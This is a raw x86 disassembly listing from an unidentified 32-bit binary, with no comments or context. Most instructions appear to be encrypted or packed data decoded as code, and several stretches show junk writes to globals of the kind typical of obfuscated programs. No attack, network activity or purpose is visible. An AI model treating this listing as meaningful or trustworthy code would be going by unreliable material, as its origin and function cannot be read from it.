  40a59e:	jge    0x40a52b
  40a5a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5a1:	cwde   
  40a5a2:	pop    ds
  40a5a3:	sbb    al,0xf3
  40a5a5:	pop    esi
  40a5a6:	cmp    eax,0xe1a567db
  40a5ab:	outs   dx,DWORD PTR ds:[esi]
  40a5ac:	mov    al,ds:0x9b7aa71b
  40a5b1:	sbb    dh,BYTE PTR [edi]
  40a5b3:	cmc    
  40a5b4:	(bad)  
  40a5b5:	into   
  40a5b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5b7:	imul   ebp,DWORD PTR [esi],0x21
  40a5ba:	rol    dh,cl
  40a5bc:	xchg   ebp,eax
  40a5bd:	enter  0xa9f4,0x6e
  40a5c1:	xlat   BYTE PTR ds:[ebx]
  40a5c2:	jmp    FWORD PTR [edx-0x3e2ae93a]
  40a5c8:	shr    DWORD PTR [edx+0x2075c677],cl
  40a5ce:	and    al,0x72
  40a5d0:	or     BYTE PTR [ebx],0x2f
  40a5d3:	pop    esi
  40a5d4:	das    
  40a5d5:	popa   
  40a5d6:	in     eax,0xa9
  40a5d8:	jle    0x40a638
  40a5da:	xchg   esi,ebp
  40a5dc:	mov    dl,0x87
  40a5de:	scas   eax,DWORD PTR es:[edi]
  40a5df:	aaa    
  40a5e0:	mov    ds:0xa1871e43,eax
  40a5e5:	stc    
  40a5e6:	jmp    0x185d3c86
  40a5eb:	mov    esp,0x7bd1e2ff
  40a5f0:	iret   
  40a5f1:	inc    ebx
  40a5f2:	mul    ch
  40a5f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5f5:	es jmp 0x46a:0x504c8c3d
  40a5fd:	push   ebx
  40a5fe:	fiadd  DWORD PTR [ebx]
  40a600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a601:	in     al,0x5a
  40a603:	inc    esp
  40a604:	cmp    al,0x10
  40a606:	push   es
  40a607:	test   DWORD PTR [edx],eax
  40a609:	jmp    0x99f778fa
  40a60e:	xchg   esp,eax
  40a60f:	je     0x40a68e
  40a611:	int    0xb4
  40a613:	test   BYTE PTR [ebx-0x25b133a6],dh
  40a619:	into   
  40a61a:	scas   al,BYTE PTR es:[edi]
  40a61b:	lock inc ebx
  40a61d:	push   edi
  40a61e:	int3   
  40a61f:	bswap  ecx
  40a621:	push   ebx
  40a622:	fild   QWORD PTR [edx]
  40a624:	xchg   DWORD PTR [edx-0x3bab1b10],ebp
  40a62a:	cdq    
  40a62b:	mov    ch,0xec
  40a62d:	retf   0x3627
  40a630:	fsub   DWORD PTR [edx+0x7ae6c063]
  40a636:	aad    0x21
  40a638:	retf   0x4af1
  40a63b:	pop    ebp
  40a63c:	fild   WORD PTR [ebx-0x2e530fdf]
  40a642:	lods   eax,DWORD PTR ds:[esi]
  40a643:	inc    edi
  40a644:	add    al,BYTE PTR [ecx+0x5dc583da]
  40a64a:	ins    DWORD PTR es:[edi],dx
  40a64b:	adc    DWORD PTR [ecx],eax
  40a64d:	and    ecx,esi
  40a64f:	xchg   ebp,eax
  40a650:	mov    WORD PTR [esi],fs
  40a652:	mov    fs,esp
  40a654:	cdq    
  40a655:	lds    ebx,FWORD PTR ds:[eax+0x28c41a95]
  40a65c:	xchg   esp,eax
  40a65d:	adc    eax,0xb244f2d0
  40a662:	lock adc DWORD PTR [ebp-0x18b8b32f],0x7
  40a66a:	and    edx,DWORD PTR [ebx]
  40a66c:	sar    DWORD PTR [edi-0x3c],cl
  40a66f:	fdivr  QWORD PTR [ecx]
  40a671:	push   ebp
  40a672:	in     al,dx
  40a673:	shl    DWORD PTR [ebp+0x52],0xff
  40a677:	loop   0x40a6ce
  40a679:	das    
  40a67a:	inc    ecx
  40a67b:	repnz stos DWORD PTR es:[edi],eax
  40a67d:	nop
  40a67e:	mov    dh,0xe6
  40a680:	mov    ah,0x74
  40a682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a683:	push   0x68
  40a685:	xchg   edi,eax
  40a686:	cld    
  40a687:	add    BYTE PTR [ebp-0x12],bl
  40a68a:	(bad)  
  40a68b:	std    
  40a68c:	(bad)  
  40a68e:	mov    ah,0x20
  40a690:	or     esp,DWORD PTR [edi+0xf]
  40a693:	and    al,0xed
  40a695:	sbb    ch,0x38
  40a698:	inc    edi
  40a699:	inc    eax
  40a69a:	pop    edx
  40a69b:	cmovno eax,DWORD PTR [ecx-0x592754c7]
  40a6a2:	pop    esp
  40a6a3:	jno    0x40a66d
  40a6a5:	loopne 0x40a721
  40a6a7:	mov    bh,0x48
  40a6a9:	push   esi
  40a6aa:	xor    ebx,edi
  40a6ac:	inc    esp
  40a6ad:	mov    edx,0x8cc8a23f
  40a6b2:	mov    ch,0x9c
  40a6b4:	icebp  
  40a6b5:	dec    edx
  40a6b6:	dec    ecx
  40a6b7:	jl     0x40a68f
  40a6b9:	push   ebx
  40a6ba:	cmp    bl,BYTE PTR [esi-0x61]
  40a6bd:	jecxz  0x40a68f
  40a6bf:	mov    ebp,0x8af9334a
  40a6c4:	inc    edi
  40a6c5:	into   
  40a6c6:	mov    al,0x4c
  40a6c8:	int    0xb8
  40a6ca:	inc    eax
  40a6cb:	pop    es
  40a6cc:	js     0x40a698
  40a6ce:	push   0x8469f232
  40a6d3:	hlt    
  40a6d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d5:	xchg   ebx,eax
  40a6d6:	sub    edi,DWORD PTR [edi]
  40a6d8:	add    al,0xae
  40a6da:	scas   eax,DWORD PTR es:[edi]
  40a6db:	mov    edi,0xa04b75a
  40a6e0:	stos   DWORD PTR es:[edi],eax
  40a6e1:	ret    0x4425
  40a6e4:	sub    DWORD PTR [ebx+0x51b1df0d],edi
  40a6ea:	ret    0x7569
  40a6ed:	cmp    edi,eax
  40a6ef:	mov    DWORD PTR ds:0x4336eb,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x4336d7,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x433767,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433797
  40a72f:	or     DWORD PTR ds:0x4337a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433793,0x433687
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43372f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4336e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43376f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43367f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43375b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43368b
  40a793:	sub    DWORD PTR ds:0x4336a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x7807ec0c
  40a7ac:	mov    edx,0x7eed16b4
  40a7b1:	jle    0x40a7eb
  40a7b3:	jl     0x40a833
  40a7b5:	jle    0x40a76a
  40a7b7:	ins    DWORD PTR es:[edi],dx
  40a7b8:	sub    DWORD PTR [ebx+eax*8],0xffffff9b
  40a7bc:	xor    ebx,ebx
  40a7be:	es dec edx
  40a7c0:	add    al,BYTE PTR [ebx+esi*2-0x4ba760db]
  40a7c7:	out    dx,eax
  40a7c8:	xor    eax,0xfd20208e
  40a7cd:	push   edi
  40a7ce:	js     0x40a822
  40a7d0:	pushf  
  40a7d1:	dec    eax
  40a7d2:	sbb    bl,BYTE PTR [ecx]
  40a7d4:	mov    edi,0x6a30b43a
  40a7d9:	in     eax,dx
  40a7da:	dec    edi
  40a7db:	xor    al,BYTE PTR [esi]
  40a7dd:	ins    DWORD PTR es:[edi],dx
  40a7de:	sbb    DWORD PTR [ebx-0x18],0xeceb24f7
  40a7e5:	sahf   
  40a7e6:	jns    0x40a7b8
  40a7e8:	ffree  st(4)
  40a7ea:	push   ecx
  40a7eb:	in     al,dx
  40a7ec:	inc    ebp
  40a7ed:	iret   
  40a7ee:	dec    edi
  40a7ef:	pop    edx
  40a7f0:	stc    
  40a7f1:	add    eax,0x37b3c600
  40a7f6:	fidiv  WORD PTR [edi-0x47]
  40a7f9:	bound  ebp,QWORD PTR [esi]
  40a7fb:	cs je  0x40a786
  40a7fe:	fmul   QWORD PTR [ecx]
  40a800:	jnp    0x40a782
  40a802:	retf   0x1a40
  40a805:	push   ebx
  40a806:	mov    bh,0xa1
  40a808:	push   ecx
  40a809:	int3   
  40a80a:	pop    edi
  40a80b:	mov    bh,0xf4
  40a80d:	or     ecx,DWORD PTR [esi+0x78b47cc6]
  40a813:	adc    dl,BYTE PTR [edi+0x6b]
  40a816:	lods   al,BYTE PTR ds:[esi]
  40a817:	ins    BYTE PTR es:[edi],dx
  40a818:	sahf   
  40a819:	rcl    BYTE PTR [ecx],0xc8
  40a81c:	cmove  edi,ecx
  40a81f:	adc    eax,0xaacb352c
  40a824:	into   
  40a825:	cmp    al,0x50
  40a827:	jne    0x40a7bf
  40a829:	pop    edx
  40a82a:	add    BYTE PTR [ecx],0xb0
  40a82d:	ds add al,0x95
  40a830:	stos   BYTE PTR es:[edi],al
  40a831:	sahf   
  40a832:	shl    BYTE PTR [eax+0x5f558ea8],0xc0
  40a839:	(bad)  
  40a83b:	cmp    ah,BYTE PTR [ebx+0x3aec38f0]
  40a841:	icebp  
  40a842:	iret   
  40a843:	inc    eax
  40a844:	repz jbe 0x40a81b
  40a847:	mov    edx,0x519a831b
  40a84c:	ds sbb esp,esi
  40a84f:	aam    0x78
  40a851:	movd   DWORD PTR [edi-0x5e969a68],mm6
  40a858:	mov    cl,0x5
  40a85a:	aas    
  40a85b:	xchg   DWORD PTR [edi-0x7d18a574],edx
  40a861:	push   0xffffffdd
  40a863:	int    0x67
  40a865:	push   ds
  40a866:	push   es
  40a867:	sti    
  40a868:	inc    esi
  40a869:	jno    0x40a8ba
  40a86b:	inc    ebx
  40a86c:	inc    ebx
  40a86d:	adc    eax,DWORD PTR [ebx-0x73]
  40a870:	lea    ebp,[ebx]
  40a872:	lea    ecx,[edx+ecx*2]
  40a875:	mov    ebp,?
  40a877:	cmp    BYTE PTR [ebp-0x6cced3ba],0x33
  40a87e:	xchg   ecx,eax
  40a87f:	jbe    0x40a8d6
  40a881:	out    0x95,eax
  40a883:	or     BYTE PTR [ecx-0x25],al
  40a886:	add    BYTE PTR [ebp-0x1f],bh
  40a889:	(bad)  
  40a88a:	mov    ebp,0x2865b146
  40a88f:	je     0x40a8da
  40a891:	xchg   esp,eax
  40a892:	les    ebp,FWORD PTR [edx+0x5b4bd294]
  40a898:	dec    BYTE PTR [esi]
  40a89a:	sub    bh,cl
  40a89c:	(bad)  
  40a89d:	xchg   esi,eax
  40a89e:	mov    esi,0x64ddd644
  40a8a3:	sbb    BYTE PTR [ecx-0x6d9d13d1],ch
  40a8a9:	adc    eax,0x3691fec4
  40a8ae:	adc    ah,bh
  40a8b0:	jl     0x40a84d
  40a8b2:	jae    0x40a8ce
  40a8b4:	xchg   ebp,eax
  40a8b5:	sub    dh,BYTE PTR [ecx+0x7828d9eb]
  40a8bb:	adc    DWORD PTR [esi+0x388df9f8],ecx
  40a8c1:	xchg   DWORD PTR [esi+0x6248704e],ebx
  40a8c7:	or     al,0x8a
  40a8c9:	push   edx
  40a8ca:	or     eax,0x9328b9a0
  40a8cf:	loopne 0x40a927
  40a8d1:	add    dl,BYTE PTR [edi+0x38a1ec5b]
  40a8d7:	push   cs
  40a8d8:	dec    eax
  40a8d9:	jne    0x40a8a4
  40a8db:	repz push esp
  40a8dd:	jl     0x40a8bf
  40a8df:	mov    ebp,0x7dd02f07
  40a8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8e5:	enter  0x995,0x3
  40a8e9:	cmp    eax,0x1b1524b7
  40a8ee:	stos   BYTE PTR es:[edi],al
  40a8ef:	xchg   esp,eax
  40a8f0:	into   
  40a8f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8f2:	pushf  
  40a8f3:	imul   ecx,DWORD PTR [ebx+0x7],0xe
  40a8f7:	dec    esp
  40a8f8:	cwde   
  40a8f9:	loopne 0x40a87c
  40a8fb:	arpl   sp,sp
  40a8fd:	enter  0x2abe,0xc7
  40a901:	add    al,0x2e
  40a903:	and    al,0x41
  40a905:	es int3 
  40a907:	and    BYTE PTR [edx+0x523f042a],0x81
  40a90e:	sbb    bl,BYTE PTR [ebp+0x1bdc4dee]
  40a914:	scas   eax,DWORD PTR es:[edi]
  40a915:	out    0xfa,al
  40a917:	push   edi
  40a918:	bound  ebx,QWORD PTR [edi]
  40a91a:	pop    ds
  40a91b:	in     eax,0x14
  40a91d:	daa    
  40a91e:	enter  0x632b,0x28
  40a922:	mov    esi,0x16df2c28
  40a927:	pusha  
  40a928:	and    cl,BYTE PTR [ebp+0x3f618e11]
  40a92e:	and    cl,dh
  40a930:	call   0x5e9b:0x51122629
  40a937:	sahf   
  40a938:	lea    ebx,[edx]
  40a93a:	add    cl,BYTE PTR [edx-0x31]
  40a93d:	inc    esp
  40a93e:	adc    eax,ebp
  40a940:	outs   dx,DWORD PTR ds:[esi]
  40a941:	outs   dx,DWORD PTR ds:[esi]
  40a942:	sahf   
  40a943:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a944:	pop    ebp
  40a945:	ss xor ecx,ecx
  40a948:	shl    esi,0xc1
  40a94b:	or     BYTE PTR [ebx-0x4eff9a26],ah
  40a951:	cmp    al,0xd4
  40a953:	and    al,0xf8
  40a955:	pop    ebx
  40a956:	sbb    dl,BYTE PTR [ecx-0x73]
  40a959:	in     al,0x62
  40a95b:	dec    edi
  40a95c:	mov    ah,0xa6
  40a95e:	pop    esi
  40a95f:	ins    BYTE PTR es:[edi],dx
  40a960:	imul   eax,DWORD PTR [ebx-0x56],0x44
  40a964:	test   BYTE PTR [esi+ebx*1],bh
  40a967:	int    0x17
  40a969:	lahf   
  40a96a:	aam    0xfc
  40a96c:	or     DWORD PTR [ebp+edi*1-0xc],0x6186f535
  40a974:	mov    ah,0x15
  40a976:	push   esi
  40a978:	bound  ebx,QWORD PTR [ecx+0x365ce354]
  40a97e:	xor    al,0x55
  40a980:	pop    ebp
  40a981:	fsubrp st(6),st
  40a983:	and    dh,BYTE PTR [esi]
  40a985:	mov    al,ds:0xb1dcc25b
  40a98a:	add    ch,bl
  40a98c:	mov    ecx,0x8f8e89cb
  40a991:	lahf   
  40a992:	mov    esi,0x842d3601
  40a997:	popf   
  40a998:	mov    esp,DWORD PTR [esi+edi*8-0x40]
  40a99c:	retf   
  40a99d:	dec    ebx
  40a99e:	bound  edi,QWORD PTR [edx-0x24a8bef6]
  40a9a4:	push   edx
  40a9a5:	(bad)  
  40a9a6:	mov    esi,DWORD PTR gs:[ebx-0x46]
  40a9aa:	aad    0xb8
  40a9ac:	xchg   edi,eax
  40a9ad:	in     eax,dx
  40a9ae:	mov    cl,0xc3
  40a9b0:	mov    edx,0x76956275
  40a9b5:	mov    ebx,0xdcec29e8
  40a9ba:	mov    ah,cl
  40a9bc:	(bad)  ds:0xf438ef19
  40a9c2:	jmp    0x40a9e1
  40a9c4:	adc    eax,0x6af1fdf0
  40a9c9:	pop    esi
  40a9ca:	or     eax,DWORD PTR ds:0xa65c2d21
  40a9d1:	add    DWORD PTR [ecx+ecx*8+0x5f],esi
  40a9d5:	cmp    eax,0xff35f364
  40a9da:	or     BYTE PTR [ebx],dl
  40a9dc:	bound  esp,QWORD PTR [ebp-0x53]
  40a9df:	(bad)  [ecx-0x43ea2c55]
  40a9e5:	ins    BYTE PTR es:[edi],dx
  40a9e6:	stos   BYTE PTR es:[edi],al
  40a9e7:	stos   BYTE PTR es:[edi],al
  40a9e8:	adc    al,0xe8
  40a9ea:	ss jno 0x40a99d
  40a9ed:	add    al,0x7f
  40a9ef:	push   esi
  40a9f0:	mov    ebp,DWORD PTR [esi-0x1456229d]
  40a9f6:	sub    BYTE PTR ds:0x2cf846f5,0x89
  40a9fd:	inc    ebp
  40a9fe:	in     al,dx
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433697,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433797,0x433767
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4336e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	xchg   ecx,eax
  40aa35:	mov    dh,0x0
  40aa37:	(bad)  
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	cmp    esp,DWORD PTR [ebx+0x37]
  40aa43:	into   
  40aa44:	xchg   edx,eax
  40aa45:	(bad)  
  40aa46:	es jmp 0x40aa54
  40aa49:	inc    edi
  40aa4a:	mov    esp,0xd5c048e4
  40aa4f:	pop    ebx
  40aa50:	leave  
  40aa51:	out    0x5a,eax
  40aa53:	cmp    bl,BYTE PTR [ecx]
  40aa55:	sub    ecx,DWORD PTR [ebp-0x5d4db7da]
  40aa5b:	add    cl,dh
  40aa5d:	xor    DWORD PTR [ebp-0x4b7b3318],esi
  40aa63:	repz call 0x8610e281
  40aa69:	ds in  al,0x23
  40aa6c:	pop    eax
  40aa6d:	push   edx
  40aa6e:	push   ds
  40aa6f:	fs mov esi,0x1cb7d184
  40aa75:	dec    edx
  40aa76:	outs   dx,DWORD PTR ds:[esi]
  40aa77:	mov    esp,0x3f0bd2ea
  40aa7c:	mov    eax,0x846702ff
  40aa81:	fadd   QWORD PTR [eax-0xf4f9f8c]
  40aa87:	je     0x40aa38
  40aa89:	call   0x3683:0x5be471b1
  40aa90:	dec    ebx
  40aa91:	sub    ebp,esi
  40aa93:	push   es
  40aa94:	xchg   ebx,eax
  40aa95:	outs   dx,BYTE PTR ds:[esi]
  40aa96:	xor    eax,0xe98a8574
  40aa9b:	(bad)  
  40aa9c:	test   al,0x2c
  40aa9e:	adc    eax,0x983c4dcc
  40aaa3:	cmp    BYTE PTR [ebx+0x2d],cl
  40aaa6:	jo     0x40aaac
  40aaa8:	xor    al,BYTE PTR [ecx+0x7476d7a9]
  40aaae:	mov    bl,0x44
  40aab0:	ins    DWORD PTR es:[edi],dx
  40aab1:	jmp    0x620d:0x9400b736
  40aab8:	dec    BYTE PTR [edx+0x73add37c]
  40aabe:	iret   
  40aabf:	fnstcw WORD PTR [ecx-0xb]
  40aac2:	(bad)  
  40aac3:	les    edx,FWORD PTR [eax-0x646bc8bb]
  40aac9:	cmp    DWORD PTR [ebp+0x712d0069],esi
  40aacf:	add    bl,BYTE PTR [eax-0x7da861e2]
  40aad5:	fcom   DWORD PTR [ebx+eax*4-0x7b5cd366]
  40aadc:	dec    edi
  40aadd:	ret    
  40aade:	jne    0x40ab0e
  40aae0:	jbe    0x40ab50
  40aae2:	or     ebx,DWORD PTR [ebx-0x3c1e9e14]
  40aae8:	sub    al,0x36
  40aaea:	or     edi,DWORD PTR [ecx]
  40aaec:	push   ebp
  40aaed:	cdq    
  40aaee:	pop    ebx
  40aaef:	adc    BYTE PTR [esi],ah
  40aaf1:	pop    ds
  40aaf2:	or     ah,BYTE PTR [ecx+0x3d]
  40aaf5:	push   esi
  40aaf6:	or     dl,cl
  40aaf8:	sbb    BYTE PTR [ebx+0x19d18e69],bl
  40aafe:	mov    BYTE PTR [esi],ah
  40ab00:	iret   
  40ab01:	and    al,0xa2
  40ab03:	mov    ebx,0xc9875e00
  40ab08:	in     eax,dx
  40ab09:	(bad)  
  40ab0a:	adc    eax,0xff126ba3
  40ab0f:	add    eax,0x2ef72a7a
  40ab14:	fidivr DWORD PTR [ebp+0x58f4c412]
  40ab1a:	add    dl,al
  40ab1c:	and    eax,0x93147313
  40ab21:	mov    ecx,DWORD PTR [edi+esi*2-0x2d]
  40ab25:	lods   eax,DWORD PTR ds:[esi]
  40ab26:	xchg   ecx,eax
  40ab27:	jmp    0xa1058898
  40ab2c:	std    
  40ab2d:	jnp    0x40ab2c
  40ab2f:	pushf  
  40ab30:	mov    BYTE PTR [eax+eiz*2+0x2b],al
  40ab34:	xchg   ebx,eax
  40ab35:	jp     0x40ab1c
  40ab37:	sbb    edi,edi
  40ab39:	jb     0x40abb1
  40ab3b:	out    dx,al
  40ab3c:	ds loopne 0x40ab00
  40ab3f:	xchg   ebx,eax
  40ab40:	repz dec eax
  40ab42:	sub    BYTE PTR [eax*2-0x70201780],dh
  40ab49:	jbe    0x40ab7d
  40ab4b:	shl    dl,1
  40ab4d:	sbb    eax,0xdeabe877
  40ab53:	ret    
  40ab54:	icebp  
  40ab55:	aas    
  40ab56:	sahf   
  40ab57:	pop    esi
  40ab58:	popf   
  40ab59:	test   DWORD PTR [edi-0x3e],eax
  40ab5c:	lea    esp,[ecx-0x50]
  40ab5f:	or     eax,0xba406312
  40ab64:	sahf   
  40ab65:	aaa    
  40ab66:	and    BYTE PTR [esi-0x341aa88],al
  40ab6c:	pop    eax
  40ab6d:	outs   dx,BYTE PTR ds:[esi]
  40ab6e:	add    DWORD PTR [eax-0x967486d],edi
  40ab74:	repnz nop
  40ab76:	xlat   BYTE PTR ds:[ebx]
  40ab77:	test   bh,0x10
  40ab7a:	das    
  40ab7b:	or     al,0x71
  40ab7d:	fucom  st(3)
  40ab7f:	outs   dx,BYTE PTR ds:[esi]
  40ab80:	and    al,0xab
  40ab82:	repnz sbb DWORD PTR [esi+0x51405d8d],edi
  40ab89:	in     eax,0xd4
  40ab8b:	jg     0x40aba8
  40ab8d:	jge    0x40ab49
  40ab8f:	repz lock sbb dl,BYTE PTR [edi]
  40ab93:	(bad)  
  40ab95:	fs xor al,0x7f
  40ab98:	icebp  
  40ab99:	call   0x2b17:0x3026b504
  40aba0:	call   0xed2e:0x24aafc7d
  40aba7:	xchg   ecx,eax
  40aba8:	mov    edx,0x623ea0f2
  40abad:	call   0x9bbedfae
  40abb2:	ror    DWORD PTR [edi-0x3a],cl
  40abb5:	sar    BYTE PTR [ebx-0x6a],cl
  40abb8:	clc    
  40abb9:	cmp    bl,dh
  40abbb:	dec    esi
  40abbc:	xor    eax,0x8e97a92b
  40abc1:	sbb    edi,edi
  40abc3:	mov    eax,ds:0x21faca70
  40abc8:	lea    edi,[ebp-0x75]
  40abcb:	mov    esi,0xa6dbe242
  40abd0:	test   eax,0x15252516
  40abd5:	or     DWORD PTR [edx+0x6f],ebx
  40abd8:	mov    edi,0xa139926a
  40abdd:	cmp    DWORD PTR gs:[esp+edx*8+0x4c],eax
  40abe2:	adc    DWORD PTR [edx+edi*1+0x22],eax
  40abe6:	int    0xb0
  40abe8:	neg    DWORD PTR [edx-0x662695d]
  40abee:	fstp   TBYTE PTR cs:[ebp+edi*2+0x55]
  40abf3:	jecxz  0x40ac51
  40abf5:	sahf   
  40abf6:	pop    ebp
  40abf7:	lahf   
  40abf8:	ins    BYTE PTR es:[edi],dx
  40abf9:	out    dx,al
  40abfa:	rcr    DWORD PTR [esi-0x2],cl
  40abfd:	cli    
  40abfe:	fbld   TBYTE PTR [ecx]
  40ac00:	mov    ebx,DWORD PTR [edx+0x36]
  40ac03:	rcr    DWORD PTR [ebp+eax*4-0x1655295e],cl
  40ac0a:	inc    DWORD PTR [esi+0x56]
  40ac0d:	and    BYTE PTR [ebp+0x25e04a04],dl
  40ac13:	aam    0x8b
  40ac15:	mov    ds:0x45b15b21,al
  40ac1a:	adc    eax,0xc6ecf1ac
  40ac1f:	fst    DWORD PTR [edi-0x13e06923]
  40ac25:	jae    0x40ac44
  40ac27:	pop    esp
  40ac28:	repnz test BYTE PTR [esi-0x4b962df1],ch
  40ac2f:	push   esp
  40ac30:	std    
  40ac31:	out    dx,eax
  40ac32:	xchg   esp,eax
  40ac33:	sub    ecx,0xffffffbf
  40ac36:	mov    al,ds:0x2301e551
  40ac3b:	out    0x64,eax
  40ac3d:	sti    
  40ac3e:	and    eax,0x98db2e7f
  40ac43:	mov    ch,BYTE PTR ds:0xbcb1e1b6
  40ac49:	pop    esp
  40ac4a:	jmp    0x949b:0x6453e950
  40ac51:	sbb    dl,BYTE PTR [edx+0x1e]
  40ac54:	(bad)
  40ac59:	mov    esp,0x21cedc0a
  40ac5e:	or     DWORD PTR ds:0x4c088291,ecx
  40ac64:	ins    BYTE PTR es:[edi],dx
  40ac65:	aaa    
  40ac66:	pop    ss
  40ac67:	inc    esi
  40ac68:	mov    edx,0x4f623684
  40ac6d:	fwait
  40ac6e:	adc    eax,0xb12af75d
  40ac73:	into   
  40ac74:	mov    ch,0x15
  40ac76:	cs xchg ebx,eax
  40ac78:	jmp    0xdc31:0x658fbfac
  40ac7f:	or     ebp,edi
  40ac81:	xchg   esi,eax
  40ac82:	add    BYTE PTR [ebx-0x37c493b7],bl
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x4336eb,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x43376f,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43376f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43376f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43376f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433808
  40acc6:	push   0x43384c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43376f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43376f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43376f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43376f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43371f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0x15797930],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad34
  40ad2c:	lds    esi,FWORD PTR [esi-0x4]
  40ad2f:	inc    ebp
  40ad30:	repz add eax,0x70899e83
  40ad36:	in     eax,0x46
  40ad38:	add    bl,BYTE PTR [edi-0x7b]
  40ad3b:	and    eax,0xc669b094
  40ad40:	push   eax
  40ad41:	fist   WORD PTR [esi]
  40ad43:	retf   0x451f
  40ad46:	jns    0x40ad83
  40ad48:	iret   
  40ad49:	sbb    bl,cl
  40ad4b:	std    
  40ad4c:	jl     0x40acf6
  40ad4e:	rcr    BYTE PTR es:[ebp-0x4aed1a13],0xea
  40ad56:	mov    al,ds:0xa4fad859
  40ad5b:	(bad)  
  40ad5c:	cwde   
  40ad5d:	aad    0xc9
  40ad5f:	xor    ebx,DWORD PTR [eax+eiz*4+0x21]
  40ad63:	pop    esp
  40ad64:	(bad)  
  40ad65:	xlat   BYTE PTR ds:[ebx]
  40ad66:	fmul   DWORD PTR [edx]
  40ad68:	aas    
  40ad69:	js     0x40ad2b
  40ad6b:	pop    edi
  40ad6c:	dec    esp
  40ad6d:	mov    edi,0x72405816
  40ad72:	push   ebx
  40ad73:	dec    eax
  40ad74:	popf   
  40ad75:	jp     0x40ad36
  40ad77:	daa    
  40ad78:	adc    BYTE PTR [ebp+edx*8+0x3d],bh
  40ad7c:	cmp    edi,DWORD PTR [edi]
  40ad7e:	push   eax
  40ad7f:	ss loopne 0x40ad9c
  40ad82:	into   
  40ad83:	scas   eax,DWORD PTR es:[edi]
  40ad84:	dec    ebx
  40ad85:	fmulp  st(1),st
  40ad87:	mov    ecx,0x42b57c64
  40ad8c:	jg     0x40adf4
  40ad8e:	ror    BYTE PTR [edi+eiz*8+0x1ef0d38],0x39
  40ad96:	push   es
  40ad97:	mov    dl,0x9f
  40ad99:	or     eax,ecx
  40ad9b:	sbb    al,0xc9
  40ad9d:	hlt    
  40ad9e:	test   eax,ebp
  40ada0:	jo     0x40adb4
  40ada2:	push   ebx
  40ada3:	in     eax,dx
  40ada4:	push   esi
  40ada5:	mov    edi,0xe14d3854
  40adaa:	add    eax,0x3071c005
  40adaf:	fcomi  st,st(7)
  40adb1:	jae    0x40adb0
  40adb3:	xor    BYTE PTR [eax+0x70cca502],0xd5
  40adba:	inc    esi
  40adbb:	dec    esi
  40adbc:	js     0x40add2
  40adbe:	imul   ecx,DWORD PTR [ecx+0x7b0df422],0x3d
  40adc5:	pop    ds
  40adc6:	jle    0x40adb1
  40adc8:	jmp    0x40ae1b
  40adca:	pop    edx
